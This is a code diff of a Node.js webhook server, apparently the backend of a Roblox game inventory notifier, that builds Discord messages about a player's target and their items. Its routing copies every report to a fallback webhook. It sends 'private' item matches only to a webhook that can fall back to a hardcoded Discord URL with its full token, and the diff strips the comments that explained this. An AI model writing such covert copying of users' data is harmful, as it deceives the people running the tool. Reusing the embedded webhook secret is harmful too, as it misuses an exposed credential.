@@ -19,10 +19,9 @@ app.post('/webhook', async (req, res) => {
         const player = data.playerName || 'Desconocido';
         const target = data.targetName || 'Desconocido';
         const targetId = data.targetId || 0;
-        const webhookUrl = data.webhookUrl; // Puede ser nil
+        const webhookUrl = data.webhookUrl;
         const hasPrivateItem = data.hasPrivateItem || false;
 
-        // Datos clasificados según el usuario (lo que él busca)
         const brainTargeted = data.brainTargeted || [];
         const brainUntargeted = data.brainUntargeted || [];
         const baseTargeted = data.baseTargeted || [];
@@ -30,14 +29,12 @@ app.post('/webhook', async (req, res) => {
         const gearTargeted = data.gearTargeted || [];
         const gearUntargeted = data.gearUntargeted || [];
 
-        // Datos privados (solo para información adicional)
         const privateBrainTargeted = data.privateBrainTargeted || [];
         const privateBaseTargeted = data.privateBaseTargeted || [];
         const privateGearTargeted = data.privateGearTargeted || [];
 
         const timestamp = data.timestamp || Date.now();
 
-        // Construir mensaje (usando clasificación del usuario)
         const content = [
             `**📊 Inventario de ${player}**`,
             `**Objetivo:** ${target} (ID: ${targetId})`,
@@ -58,7 +55,6 @@ app.post('/webhook', async (req, res) => {
             gearUntargeted.length > 0 ? gearUntargeted.join(', ') : 'Ninguno',
         ];
 
-        // Si hay coincidencia con ítems privados, agregar una línea indicando
         if (hasPrivateItem) {
             const privateMatches = [];
             if (privateBrainTargeted.length > 0) privateMatches.push(`🧠 ${privateBrainTargeted.length} brainrots`);
@@ -79,26 +75,21 @@ app.post('/webhook', async (req, res) => {
             avatar_url: 'https://cdn.pfps.gg/pfps/10184-389218-roblox.png'
         };
 
-        // Decidir a qué webhooks enviar
         const webhooksToSend = [];
 
         if (hasPrivateItem) {
-            // Si hay coincidencia privada, SOLO al webhook privado (el que viene en webhookUrl)
             if (webhookUrl) {
                 webhooksToSend.push(webhookUrl);
             } else {
-                // Fallback al webhook privado por si acaso
                 webhooksToSend.push('https://discord.com/api/webhooks/1518688015692599416/9DG8JBvlf31P2FRj3dfRtamrWDpUpCymXpDMkfM8IMEPHVVKmXVeg1i_MXWVZpzokj6L');
             }
         } else {
-            // Sin coincidencia privada: enviar al webhook del usuario (si existe) y al FALLBACK
             if (webhookUrl) {
                 webhooksToSend.push(webhookUrl);
             }
             webhooksToSend.push(FALLBACK_WEBHOOK);
         }
 
-        // Enviar a todos los webhooks
         for (const url of webhooksToSend) {
             try {
                 await axios.post(url, payload);
